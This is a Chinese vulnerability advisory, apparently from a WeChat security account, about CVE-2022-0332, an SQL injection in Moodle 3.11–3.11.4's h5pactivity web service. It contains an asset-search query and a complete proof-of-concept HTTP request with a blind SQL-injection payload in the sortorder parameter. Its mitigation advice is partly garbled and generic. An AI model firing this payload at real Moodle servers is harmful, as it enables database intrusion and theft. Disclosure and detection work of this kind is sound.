<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6IG6kCJHdGUC_Mh2Gx0mxQ)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9qzqrRnBnOb1OSO01klMoTeRhSlRic84peYuLlolHfx1ux10B53UMOmw/640?wx_fmt=png)

**点击蓝字** 关注我们

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oVSibjZvJFE1oL8DicXxgodRSP49fE8VbT95ckia4eQkQzczKRbYcpePQ/640?wx_fmt=png)






-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

  

**_声明  
_**

本文作者：CKCsec安全研究院  
本文字数：625

阅读时长：3 分钟

项目/链接：文末获取

**本文属于【CKCsec安全研究院】原创文章，未经许可禁止转载**

遵纪守法  

-------

任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益

漏洞描述
----

在 Moodle 3.11 到 3.11.4 版本中发现了一个缺陷。在负责获取用户尝试数据的 h5p 活动 Web 服务中发现了 SQL 注入风险。

风险等级
----

高危

影响版本
----

Moodle 3.11 到 3.11.4

资产确定
----

```
app="Moodle"  

```

漏洞检测
----

**「POC」**

```
 /moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29
```

```
GET /moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29 HTTP/1.1  
Cache-Control: no-cache  
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0  
Host: 127.0.0.1  
Accept: */*  
Accept-Encoding: gzip, deflate  
Connection: close  

```

![](https://mmbiz.qpic.cn/mmbiz_png/05AlicrBviacVeYUUlmsdduEbwBhktMZHhibP4mlA7QsS8DLelG2ygoWSrlicyk8qVnZL17GOzI7BAbGVfVrCKC1Ow/640?wx_fmt=png)

cve
---

https://github.com/numanturle/CVE-2022-0332

修复方案
----

目前官方已发布修复版本修复了该漏洞，请受影响的用户升级到安全版本

若无法及时升级的用户，可根据官方提供的修复建议通过修改默认用户名和密码，并设置访问 d的白名单进行缓解。

另外关注公众号后台回复“**0112**”可免费获取代码审计教程，后台回复“**0110**”获取[红队攻防内部手册](http://mp.weixin.qq.com/s?__biz=MzkxMTIyMjg0NQ==&mid=2247488677&idx=1&sn=f0d52096bc9b7a6a34d1ad0fb9d73727&chksm=c11e25f7f669ace128a38a07e22e3988e41dd03fb1deb4ce6f793231f95c8c91ba038d766eb3&scene=21#wechat_redirect)。

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/05AlicrBviacXkUqRI6vhVwiaXBvrvf0zCl8iaAl3rDg1hgREZVZkQocotu6Ggia4nO7tibaSoKsJNgBTwsHdVAARICw/0?wx_fmt=png) ** CKCsec安全研究院 ** 专注于网络安全的公众号，分享最新的Red Team、APT等高级攻击技术、以及最新的漏洞威胁刨析。 29篇原创内容   公众号

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，CKCsec安全研究院以及文章作者不为此承担任何责任。  
  

CKCsec安全研究院有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。